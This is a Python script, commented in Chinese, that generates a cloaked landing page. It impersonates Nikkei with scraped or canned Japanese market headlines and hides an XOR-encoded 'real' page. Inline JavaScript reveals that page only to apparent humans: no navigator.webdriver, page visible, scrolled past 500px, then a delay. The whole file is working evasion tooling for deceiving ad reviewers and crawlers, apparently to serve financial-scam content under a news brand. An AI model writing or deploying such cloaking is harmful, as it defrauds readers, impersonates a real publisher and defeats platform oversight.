import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= 配置区 =================
TARGET_REAL_PAGE = "index.html"  # 您的真实落地页
OUTPUT_ZIP_NAME = "nikkei_polymorphic_v5"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5Fixed:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """步骤 1: 增强型新闻采集 + 强制保底内容"""
        print("📡 正在构建视觉多态外壳...")
        articles = []
        try:
            # 尝试抓取日经市场动态
            url = "https://www.nikkei.com/news/category/market/"
            res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            # 兼容日经多种结构
            items = soup.select('article') or soup.select('.m-article')
            for item in items[:15]:
                title = item.find(['span', 'a'], class_=lambda x: x and 'title' in x.lower())
                if title:
                    articles.append({"t": title.get_text().strip(), "s": "最新の市場動向と経済指標に基づく詳細な分析レポートです。投資戦略の参考にしてください。"})
        except: pass

        # 如果爬虫抓取不到，注入强制保底新闻，确保页面高度足够触发滚动
        if len(articles) < 5:
            articles = [
                {"t": "日経平均株価、続伸の背景と今後の展望", "s": "市場関係者によると、堅調な企業決算を背景に買い注文が先行しています。"},
                {"t": "円相場の変動が輸出企業に与える影響", "s": "為替市場では円安傾向が続いており、輸出セクターの収益改善が期待されています。"},
                {"t": "次世代半導体投資、国内メーカーの動向", "s": "政府の支援策を受け、主要各社が最先端プロセスの開発を加速させています。"},
                {"t": "長期金利の上昇と住宅ローン市場への影響", "s": "金融政策の修正観測を受け、長期金利が緩やかに上昇しています。"},
                {"t": "グローバル市場における日本株の優位性", "s": "海外投資家による日本株買いが継続しており、評価が高まっています。"},
                {"t": "DX推進がもたらす産業構造の変革", "s": "多くの企業がデジタル転換を急いでおり、新たなビジネスモデルが誕生しています。"}
            ] * 3 # 重复三次确保长度

        random.shuffle(articles)
        cls = {k: self._rand_str(8) for k in ['header', 'logo', 'main', 'side', 'art', 'title', 'footer']}
        main_blue = f"rgb(0, {random.randint(40, 60)}, {random.randint(90, 110)})"

        css = f"""
        body {{ font-family: sans-serif; color: #333; line-height: 1.6; margin: 0; background: #fff; }}
        .{cls['header']} {{ border-bottom: 2px solid {main_blue}; padding: 15px 5%; display: flex; align-items: center; justify-content: space-between; }}
        .{cls['logo']} {{ color: {main_blue}; font-size: 24px; font-weight: 900; }}
        .{cls['main']} {{ max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1fr 300px; gap: 40px; padding: 20px 5%; }}
        .{cls['art']} {{ margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }}
        .{cls['title']} {{ font-size: 19px; font-weight: bold; color: #000; }}
        .{cls['side']} {{ background: #f8f8f8; padding: 20px; border-top: 3px solid #333; height: fit-content; }}
        .{cls['footer']} {{ background: #111; color: #777; padding: 40px; text-align: center; font-size: 11px; }}
        """

        html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>日本経済新聞</title><style>{css}</style></head><body>
        <header class="{cls['header']}"><div class="{cls['logo']}">NIKKEI Financial</div></header>
        <div class="{cls['main']}"><section>"""
        for a in articles:
            html += f'<div class="{cls["art"]}"><div class="{cls["title"]}">{a["t"]}</div><p>{a["s"]}</p></div>'
        html += f'</section><aside class="{cls["side"]}"><h3>ランキング</h3><div>・円安の背景分析</div></aside></div>'
        html += f'<footer class="{cls["footer"]}">© {datetime.date.today().year} Nikkei Inc.</footer></body></html>'
        
        with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)

    def scramble_and_pack(self):
        """步骤 2: 执行 XOR 加密"""
        print("🔐 执行 V5 级逻辑混淆...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents])
            w_title = w_soup.title.string

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            # 修正路径及拷贝素材
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): shutil.copy(clean_src, dest)

        # 加密真实 body 内容
        raw_html = "".join([str(x) for x in r_soup.body.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:215vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: f.write(final_html)

    def create_zip(self):
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"✨ 打包成功: {OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if os.path.exists(TARGET_REAL_PAGE):
        flow = LPAutomatorV5Fixed()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
    else: print(f"❌ 找不到 {TARGET_REAL_PAGE}")
